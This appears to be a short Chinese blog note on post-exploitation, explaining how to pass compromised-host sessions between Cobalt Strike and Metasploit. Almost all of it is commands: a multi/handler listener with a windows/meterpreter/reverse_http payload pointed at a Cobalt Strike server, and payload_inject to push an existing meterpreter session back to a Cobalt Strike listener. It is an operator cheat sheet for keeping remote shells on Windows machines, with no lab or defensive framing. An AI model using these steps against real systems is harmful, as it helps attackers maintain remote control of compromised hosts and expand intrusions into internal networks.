---
title: MSF和CS联动
date: 2025-02-17 08:45:54
updated: 2025-02-17 11:48:12
tags:
  - 内网
---
# CS复制会话到MSF

```shell
1、CS创建外部监听器
2、MSF开启监听
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost CS服务器地址
set lport CS外联监听器的端口
3、CS指定会话里运行spawn 外联监听器名
```

# MSF复制会话到CS

```shell
1、将MSF获得meterpreter会话放在后台：backgroud
2、注入会话
use exploit/windows/local/payload_inject
session 选择要复制的session会话
set payload windows/meterpreter/reverse_http
set lhost CS服务器地址
set lport CS监听器的端口
3、CS创建监听器
4、MSF运行注入
```